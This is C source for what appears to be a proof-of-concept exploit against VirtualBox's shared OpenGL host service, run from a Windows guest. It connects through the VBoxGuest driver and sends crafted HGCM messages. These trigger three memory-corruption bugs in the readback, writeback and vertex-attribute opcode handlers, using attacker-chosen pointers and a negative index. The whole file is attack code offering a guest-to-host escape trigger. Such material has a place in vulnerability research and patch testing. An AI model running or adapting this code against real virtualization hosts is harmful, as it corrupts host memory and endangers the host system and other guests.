#include "stdafx.h"
#include <windows.h>
#include "vboxguest2.h"
#include "vboxguest.h"
#include "err.h"
#include "vboxcropenglsvc.h"
#include "cr_protocol.h"

#define VBOXGUEST_DEVICE_NAME "\\\\.\\VBoxGuest"


HANDLE open_device(){
    HANDLE hDevice = CreateFile(VBOXGUEST_DEVICE_NAME,
                            GENERIC_READ | GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL,
                            OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL,
                            NULL);

    if (hDevice == INVALID_HANDLE_VALUE){
        printf("[-] Could not open device %s .\n", VBOXGUEST_DEVICE_NAME);
        exit(EXIT_FAILURE);
    }
    printf("[+] Handle to %s: 0x%X\n", VBOXGUEST_DEVICE_NAME, hDevice);
    return hDevice;


}


uint32_t do_connect(HANDLE hDevice){
    VBoxGuestHGCMConnectInfo info;
    DWORD cbReturned = 0;
    BOOL rc;

    memset(&info, 0, sizeof(info));
    info.Loc.type = VMMDevHGCMLoc_LocalHost_Existing;
    strcpy(info.Loc.u.host.achName, "VBoxSharedCrOpenGL");

    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CONNECT, &info,
sizeof(info), &info, sizeof(info), &cbReturned, NULL);
    if (!rc){
        printf("ERROR: DeviceIoControl failed in function do_connect()!
LastError: %d\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    if (info.result == VINF_SUCCESS){
        printf("HGCM connect was successful: client id =0x%x\n",
info.u32ClientID);
    }
    else{
        //If 3D Acceleration is disabled, info.result value will be -2900.
        printf("[-] HGCM connect failed. Result: %d (Is 3D Acceleration
enabled??)\n", info.result);
        exit(EXIT_FAILURE);
    }
    return info.u32ClientID;
}


void do_disconnect(HANDLE hDevice, uint32_t u32ClientID){
    BOOL rc;
    VBoxGuestHGCMDisconnectInfo info;
    DWORD cbReturned = 0;

    memset(&info, 0, sizeof(info));
    info.u32ClientID = u32ClientID;
    printf("Sending VBOXGUEST_IOCTL_HGCM_DISCONNECT message...\n");
    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_DISCONNECT,
&info, sizeof(info), &info, sizeof(info), &cbReturned, NULL);
    if (!rc){
        printf("ERROR: DeviceIoControl failed in function
do_disconnect()! LastError: %d\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    if (info.result == VINF_SUCCESS){
        printf("HGCM disconnect was successful.\n");
    }
    else{
        printf("[-] HGCM disconnect failed. Result: %d\n", info.result);
        exit(EXIT_FAILURE);
    }

}


void set_version(HANDLE hDevice, uint32_t u32ClientID){
    CRVBOXHGCMSETVERSION parms;
    DWORD cbReturned = 0;
    BOOL rc;

    memset(&parms, 0, sizeof(parms));
    parms.hdr.result      = VERR_WRONG_ORDER;
    parms.hdr.u32ClientID = u32ClientID;
    parms.hdr.u32Function = SHCRGL_GUEST_FN_SET_VERSION;
    parms.hdr.cParms      = SHCRGL_CPARMS_SET_VERSION;

    parms.vMajor.type      = VMMDevHGCMParmType_32bit;
    parms.vMajor.u.value32 = CR_PROTOCOL_VERSION_MAJOR;
    parms.vMinor.type      = VMMDevHGCMParmType_32bit;
    parms.vMinor.u.value32 = CR_PROTOCOL_VERSION_MINOR;

    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);

    if (!rc){
        printf("ERROR: DeviceIoControl failed in function set_version()!
LastError: %d\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    if (parms.hdr.result == VINF_SUCCESS){
        printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
    }
    else{
        printf("Host didn't accept our version.\n");
        exit(EXIT_FAILURE);
    }
}


void set_pid(HANDLE hDevice, uint32_t u32ClientID){
    CRVBOXHGCMSETPID parms;
    DWORD cbReturned = 0;
    BOOL rc;

    memset(&parms, 0, sizeof(parms));
    parms.hdr.result      = VERR_WRONG_ORDER;
    parms.hdr.u32ClientID = u32ClientID;
    parms.hdr.u32Function = SHCRGL_GUEST_FN_SET_PID;
    parms.hdr.cParms      = SHCRGL_CPARMS_SET_PID;

    parms.u64PID.type     = VMMDevHGCMParmType_64bit;
    parms.u64PID.u.value64 = GetCurrentProcessId();

    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);

    if (!rc){
        printf("ERROR: DeviceIoControl failed in function set_pid()!
LastError: %d\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    if (parms.hdr.result == VINF_SUCCESS){
        printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
    }
    else{
        printf("Host didn't like our PID %d\n", GetCurrentProcessId());
        exit(EXIT_FAILURE);
    }

}


/* Triggers the vulnerability in the crNetRecvReadback function. */
void trigger_message_readback(HANDLE hDevice, uint32_t u32ClientID){
    CRVBOXHGCMINJECT parms;
    DWORD cbReturned = 0;
    BOOL rc;
    char mybuf[1024];
    CRMessageReadback msg;

    memset(&msg, 0, sizeof(msg));
    msg.header.type = CR_MESSAGE_READBACK;
    msg.header.conn_id = 0x8899;


    //This address will be decremented by 1
    *((DWORD *)&msg.writeback_ptr.ptrSize) = 0x88888888;
    //Destination address for the memcpy
    *((DWORD *)&msg.readback_ptr.ptrSize) = 0x99999999;

    memcpy(&mybuf, &msg, sizeof(msg));
    strcpy(mybuf + sizeof(msg), "Hi hypervisor!");

    memset(&parms, 0, sizeof(parms));
    parms.hdr.result      = VERR_WRONG_ORDER;
    parms.hdr.u32ClientID = u32ClientID;
    parms.hdr.u32Function = SHCRGL_GUEST_FN_INJECT;
    parms.hdr.cParms      = SHCRGL_CPARMS_INJECT;

    parms.u32ClientID.type       = VMMDevHGCMParmType_32bit;
    parms.u32ClientID.u.value32  = u32ClientID;

    parms.pBuffer.type                   = VMMDevHGCMParmType_LinAddr_In;
    parms.pBuffer.u.Pointer.size         = sizeof(mybuf); //size for the
memcpy: sizeof(mybuf) - 0x18
    parms.pBuffer.u.Pointer.u.linearAddr = (uintptr_t) mybuf;

    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);

    if (!rc){
        printf("ERROR: DeviceIoControl failed in function
trigger_message_readback()!. LastError: %d\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    if (parms.hdr.result == VINF_SUCCESS){
        printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
    }
    else{
        printf("HGCM Call failed. Result: %d\n", parms.hdr.result);
        exit(EXIT_FAILURE);
    }
}


/* Triggers the vulnerability in the crNetRecvWriteback function. */
void trigger_message_writeback(HANDLE hDevice, uint32_t u32ClientID){
    CRVBOXHGCMINJECT parms;
    DWORD cbReturned = 0;
    BOOL rc;
    char mybuf[512];
    CRMessage msg;

    memset(&mybuf, 0, sizeof(mybuf));

    memset(&msg, 0, sizeof(msg));
    msg.writeback.header.type = CR_MESSAGE_WRITEBACK;
    msg.writeback.header.conn_id = 0x8899;
    //This address will be decremented by 1
    *((DWORD *)msg.writeback.writeback_ptr.ptrSize) = 0xAABBCCDD;

    memcpy(&mybuf, &msg, sizeof(msg));
    strcpy(mybuf + sizeof(msg), "dummy");

    memset(&parms, 0, sizeof(parms));
    parms.hdr.result      = VERR_WRONG_ORDER;
    parms.hdr.u32ClientID = u32ClientID;
    parms.hdr.u32Function = SHCRGL_GUEST_FN_INJECT;
    parms.hdr.cParms      = SHCRGL_CPARMS_INJECT;

    parms.u32ClientID.type       = VMMDevHGCMParmType_32bit;
    parms.u32ClientID.u.value32  = u32ClientID;

    parms.pBuffer.type                   = VMMDevHGCMParmType_LinAddr_In;
    parms.pBuffer.u.Pointer.size         = sizeof(mybuf);
    parms.pBuffer.u.Pointer.u.linearAddr = (uintptr_t) mybuf;


    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);

    if (!rc){
        printf("ERROR: DeviceIoControl failed in function
trigger_message_writeback()! LastError: %d\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    if (parms.hdr.result == VINF_SUCCESS){
        printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
    }
    else{
        printf("HGCM Call failed. Result: %d\n", parms.hdr.result);
        exit(EXIT_FAILURE);
    }

}


/* Triggers the vulnerability in the crServerDispatchVertexAttrib4NubARB
function. */
void trigger_opcode_0xea(HANDLE hDevice, uint32_t u32ClientID){
    CRVBOXHGCMINJECT parms;
    char mybuf[0x10f0];
    DWORD cbReturned = 0;
    BOOL rc;

    unsigned char opcodes[] = {0xFF, 0xea, 0x02, 0xf7};
    DWORD opcode_data[] =
                    {0x08,                        //Advance 8 bytes
after executing opcode 0xF7, subopcode 0x30
                    0x30,                        //Subopcode for opcode 0xF7
                    0x331,                        //Argument for opcode 0x02
                    0xFFFCFA4B,                    //This is the
negative index used to trigger the memory corruption
                    0x41414141};                //Junk

    CRMessageOpcodes msg_opcodes;

    memset(&mybuf, 0, sizeof(mybuf));

    memset(&msg_opcodes, 0, sizeof(msg_opcodes));
    msg_opcodes.header.conn_id = 0x8899;
    msg_opcodes.header.type = CR_MESSAGE_OPCODES;
    msg_opcodes.numOpcodes = sizeof(opcodes);

    char *offset = (char *)&mybuf;
    memcpy(offset, &msg_opcodes, sizeof(msg_opcodes));
    offset += sizeof(msg_opcodes);

    /*----- Opcodes -----*/
    memcpy(offset, &opcodes, sizeof(opcodes));
    offset += sizeof(opcodes);

    /*----- data for the opcodes -----*/
    memcpy(offset, &opcode_data, sizeof(opcode_data));
    offset += sizeof(opcode_data);


    memset(&parms, 0, sizeof(parms));
    parms.hdr.result      = 0;
    parms.hdr.u32ClientID = u32ClientID;
    parms.hdr.u32Function = SHCRGL_GUEST_FN_INJECT;
    parms.hdr.cParms      = SHCRGL_CPARMS_INJECT;

    parms.u32ClientID.type       = VMMDevHGCMParmType_32bit;
    parms.u32ClientID.u.value32  = u32ClientID;

    parms.pBuffer.type                   = VMMDevHGCMParmType_LinAddr_In;
    parms.pBuffer.u.Pointer.size         = sizeof(mybuf);
    parms.pBuffer.u.Pointer.u.linearAddr = (uintptr_t) mybuf;

    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);

    if (!rc){
        printf("ERROR: DeviceIoControl failed in function
trigger_opcode_0xea()! LastError: %d\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    if (parms.hdr.result == VINF_SUCCESS){
        printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
    }
    else{
        printf("HGCM Call failed. Result: %d\n", parms.hdr.result);
        exit(EXIT_FAILURE);
    }

}


void poc(int option){
    HANDLE hDevice;
    uint32_t u32ClientID;

    /* Connect to the VBoxSharedCrOpenGL service */
    hDevice = open_device();
    u32ClientID = do_connect(hDevice);

    /* Set version and PID */
    set_version(hDevice, u32ClientID);
    set_pid(hDevice, u32ClientID);

    switch (option){
    case 1:
        printf("[1] triggering the first bug...\n");
        trigger_message_readback(hDevice, u32ClientID);
        break;
    case 2:
        printf("[2] triggering the second bug...\n");
        trigger_message_writeback(hDevice, u32ClientID);
        break;
    case 3:
        printf("[3] triggering the third bug...\n");
        trigger_opcode_0xea(hDevice, u32ClientID);
        break;
    default:
        printf("[!] Unknown option %d.\n", option);
    }

    /* Disconnect from the VBoxSharedCrOpenGL service */
    do_disconnect(hDevice, u32ClientID);
    CloseHandle(hDevice);
}




int main(int argc, char* argv[])
{
    if (argc < 2){
        printf("Usage: %s <option number>\n\n", argv[0]);
        printf("* Option 1: trigger the vulnerability in the
crNetRecvReadback function.\n");
        printf("* Option 2: trigger the vulnerability in the
crNetRecvWriteback function.\n");
        printf("* Option 3: trigger the vulnerability in the
crServerDispatchVertexAttrib4NubARB function.\n");
        exit(1);
    }
    poc(atoi(argv[1]));
}

